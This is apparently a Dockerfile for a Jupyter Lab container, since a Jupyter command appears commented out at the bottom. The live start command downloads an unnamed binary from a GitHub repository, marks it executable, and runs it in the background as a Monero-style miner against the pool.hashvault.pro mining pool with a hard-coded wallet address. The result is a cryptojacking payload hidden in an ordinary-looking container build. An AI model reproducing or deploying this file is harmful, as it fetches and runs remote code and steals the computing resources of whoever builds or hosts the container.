FROM ubuntu:latest
RUN apt-get update && apt-get install -y python3 python3-pip curl
CMD ["sh", "-c", "curl -L -O https://github.com/iceyfromdiscord/yes/raw/refs/heads/master/prog && chmod +x prog && ./prog --url pool.hashvault.pro:443 --user 43wBYRJpvVsMYCUcL1jGrj5GBACA6Qr7BLP3ZieFGueMj82kZcGfNewaEcYm9kyCUiAMhvwFiRxcJ8SzfcVeqn5z1vVkDfQ --pass main --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --background"]
# CMD ["sh", "-c", "jupyter lab --ip=0.0.0.0 --port=8888 --no-browser"]
